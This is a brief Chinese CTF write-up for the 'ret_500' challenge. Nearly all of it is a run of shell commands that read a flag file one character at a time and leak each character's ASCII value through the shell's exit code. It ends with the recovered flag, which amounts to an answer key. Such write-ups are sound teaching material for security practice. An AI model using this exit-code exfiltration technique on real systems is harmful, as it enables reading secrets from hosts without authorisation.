# ret_500

> 参考：[TAMUctf 2020](https://ctftime.org/task/10878)

给了个 Shell，只会返回命令执行的结果，做的方法有很多，原本想法是用 cut 和 grep 两个命令。[@XxX（@n132）](https://n132.github.io/)提供了 Shell Script 的另一种做法：

```bash
return `printf "%d" "'\`cut -c0-0 flag\`"`
return `printf "%d" "'\`cut -c1-1 flag\`"`
return `printf "%d" "'\`cut -c2-2 flag\`"`
return `printf "%d" "'\`cut -c3-3 flag\`"`
return `printf "%d" "'\`cut -c4-4 flag\`"`
return `printf "%d" "'\`cut -c5-5 flag\`"`
return `printf "%d" "'\`cut -c6-6 flag\`"`
return `printf "%d" "'\`cut -c7-7 flag\`"`
return `printf "%d" "'\`cut -c8-8 flag\`"`
return `printf "%d" "'\`cut -c9-9 flag\`"`
return `printf "%d" "'\`cut -c10-10 flag\`"`
return `printf "%d" "'\`cut -c11-11 flag\`"`
return `printf "%d" "'\`cut -c12-12 flag\`"`
return `printf "%d" "'\`cut -c13-13 flag\`"`
return `printf "%d" "'\`cut -c14-14 flag\`"`
return `printf "%d" "'\`cut -c15-15 flag\`"`
return `printf "%d" "'\`cut -c16-16 flag\`"`
return `printf "%d" "'\`cut -c17-17 flag\`"`
return `printf "%d" "'\`cut -c18-18 flag\`"`
return `printf "%d" "'\`cut -c19-19 flag\`"`
return `printf "%d" "'\`cut -c20-20 flag\`"`
return `printf "%d" "'\`cut -c21-21 flag\`"`
return `printf "%d" "'\`cut -c22-22 flag\`"`
return `printf "%d" "'\`cut -c23-23 flag\`"`
return `printf "%d" "'\`cut -c24-24 flag\`"`
return `printf "%d" "'\`cut -c25-25 flag\`"`
return `printf "%d" "'\`cut -c26-26 flag\`"`
return `printf "%d" "'\`cut -c27-27 flag\`"`
return `printf "%d" "'\`cut -c28-28 flag\`"`
return `printf "%d" "'\`cut -c29-29 flag\`"`
return `printf "%d" "'\`cut -c30-30 flag\`"`
return `printf "%d" "'\`cut -c31-31 flag\`"`
return `printf "%d" "'\`cut -c32-32 flag\`"`
return `printf "%d" "'\`cut -c33-33 flag\`"`
return `printf "%d" "'\`cut -c34-34 flag\`"`
return `printf "%d" "'\`cut -c35-35 flag\`"`
return `printf "%d" "'\`cut -c36-36 flag\`"`
return `printf "%d" "'\`cut -c37-37 flag\`"`
return `printf "%d" "'\`cut -c38-38 flag\`"`
return `printf "%d" "'\`cut -c39-39 flag\`"`
#zjgsuctf{$hoW_m3_t#e_r3t_c0d3_&_w0W!}
```
